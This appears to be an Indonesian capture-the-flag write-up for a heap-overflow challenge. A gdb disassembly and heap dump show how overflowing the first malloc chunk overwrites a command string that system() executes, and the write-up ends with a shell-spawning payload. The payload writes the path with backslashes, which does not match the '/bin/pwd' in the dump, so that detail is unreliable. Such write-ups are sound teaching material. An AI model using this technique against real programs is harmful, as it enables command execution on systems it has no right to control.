# Input_Injection_2
## Problem
```
gef➤  disas main
Dump of assembler code for function main:
   0x00000000004011b6 <+0>:	endbr64
   0x00000000004011ba <+4>:	push   rbp
   0x00000000004011bb <+5>:	mov    rbp,rsp
   0x00000000004011be <+8>:	sub    rsp,0x10
   0x00000000004011c2 <+12>:	mov    edi,0x1c
   0x00000000004011c7 <+17>:	call   0x4010a0 <malloc@plt>
   0x00000000004011cc <+22>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004011d0 <+26>:	mov    edi,0x1c
   0x00000000004011d5 <+31>:	call   0x4010a0 <malloc@plt>
   0x00000000004011da <+36>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000004011de <+40>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004011e2 <+44>:	mov    rsi,rax
   0x00000000004011e5 <+47>:	lea    rdi,[rip+0xe18]        # 0x402004
   0x00000000004011ec <+54>:	mov    eax,0x0
   0x00000000004011f1 <+59>:	call   0x401090 <printf@plt>
   0x00000000004011f6 <+64>:	mov    rax,QWORD PTR [rip+0x2e53]        # 0x404050 <stdout@@GLIBC_2.2.5>
   0x00000000004011fd <+71>:	mov    rdi,rax
   0x0000000000401200 <+74>:	call   0x4010b0 <fflush@plt>
   0x0000000000401205 <+79>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401209 <+83>:	mov    rsi,rax
   0x000000000040120c <+86>:	lea    rdi,[rip+0xe01]        # 0x402014
   0x0000000000401213 <+93>:	mov    eax,0x0
   0x0000000000401218 <+98>:	call   0x401090 <printf@plt>
   0x000000000040121d <+103>:	mov    rax,QWORD PTR [rip+0x2e2c]        # 0x404050 <stdout@@GLIBC_2.2.5>
   0x0000000000401224 <+110>:	mov    rdi,rax
   0x0000000000401227 <+113>:	call   0x4010b0 <fflush@plt>
   0x000000000040122c <+118>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401230 <+122>:	movabs rcx,0x6477702f6e69622f
   0x000000000040123a <+132>:	mov    QWORD PTR [rax],rcx
   0x000000000040123d <+135>:	mov    BYTE PTR [rax+0x8],0x0
   0x0000000000401241 <+139>:	lea    rdi,[rip+0xdd9]        # 0x402021
   0x0000000000401248 <+146>:	mov    eax,0x0
   0x000000000040124d <+151>:	call   0x401090 <printf@plt>
   0x0000000000401252 <+156>:	mov    rax,QWORD PTR [rip+0x2df7]        # 0x404050 <stdout@@GLIBC_2.2.5>
   0x0000000000401259 <+163>:	mov    rdi,rax
   0x000000000040125c <+166>:	call   0x4010b0 <fflush@plt>
   0x0000000000401261 <+171>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401265 <+175>:	mov    rsi,rax
   0x0000000000401268 <+178>:	lea    rdi,[rip+0xdc3]        # 0x402032
   0x000000000040126f <+185>:	mov    eax,0x0
   0x0000000000401274 <+190>:	call   0x4010c0 <__isoc99_scanf@plt>
   0x0000000000401279 <+195>:	mov    rdx,QWORD PTR [rbp-0x10]
   0x000000000040127d <+199>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401281 <+203>:	mov    rsi,rax
   0x0000000000401284 <+206>:	lea    rdi,[rip+0xdaa]        # 0x402035
   0x000000000040128b <+213>:	mov    eax,0x0
   0x0000000000401290 <+218>:	call   0x401090 <printf@plt>
   0x0000000000401295 <+223>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401299 <+227>:	mov    rdi,rax
=> 0x000000000040129c <+230>:	call   0x401080 <system@plt>
   0x00000000004012a1 <+235>:	mov    rax,QWORD PTR [rip+0x2da8]        # 0x404050 <stdout@@GLIBC_2.2.5>
   0x00000000004012a8 <+242>:	mov    rdi,rax
   0x00000000004012ab <+245>:	call   0x4010b0 <fflush@plt>
   0x00000000004012b0 <+250>:	mov    eax,0x0
   0x00000000004012b5 <+255>:	leave
   0x00000000004012b6 <+256>:	ret
End of assembler dump.

```

## Solusi
### Diketahui
Terdapat beberapa peluang kerentanan, seperti:  
* malloc
* printf
* scanf
* system (wawawawawawaww)

### Uji
Sebetulnya kita bisa langsung coba overflow dengan scanf yang kita punya, akan tetapi kita tidak akan belajar apa-apa dari itu. Jadi, pertama kita harus tahu dulu apa yang terjadi (setidaknya gambaran umumnya):
* Program mengalokasikan memori sebesar 0x1c (0x30 setelah ditambah metadata) sebanyak 2 kali
* Program print lokasi memori dari salah satu alamat yang telah dialokasikan memori kepadanya
* Program menyimpan string "\bin\pwd" ke chunk ke2 secara hardcoded (*main+122)
* Program meminta input tanpa proteksi menggunakan scanf ke heap chunks pertama
* Program print value chunk pertama
* Program eksekusi chunk ke2

Sudah Tentu jelas di sini kita akan overflow nilai chunk ke2 melalui chunk ke1

### Offset
Offset bisa diambil dengan cara overflow debrujin atau yang lebih elegan ialah dengan melihat size dari chunk ke1, yaitu dengan command di gdb(dengan gef) 
```
gef➤  heap chunks
Chunk(addr=0x405010, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405010     62 61 62 61 00 00 00 00 00 00 00 00 00 00 00 00    baba............]
Chunk(addr=0x405040, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405040     2f 62 69 6e 2f 70 77 64 00 00 00 00 00 00 00 00    /bin/pwd........]
Chunk(addr=0x405070, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405070     48 65 6c 6c 6f 2c 20 62 61 62 61 2e 20 59 6f 75    Hello, baba. You]
Chunk(addr=0x405480, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405480     62 61 62 61 0a 00 00 00 00 00 00 00 00 00 00 00    baba............]
Chunk(addr=0x405890, size=0x20780, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000405890     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]

```
Bisa dilihat dengan jelas bahwa offsetnya ialah size dari chunk pertama, yaitu 0x30, sehingga kita bisa tulis payloadnya:\
Aa0Bb1Cc2Dd3Ee4Ff5Gg6Hh7Ii8Jj9Kk0Ll1Mm2Nn3Oo4Pp5\bin\sh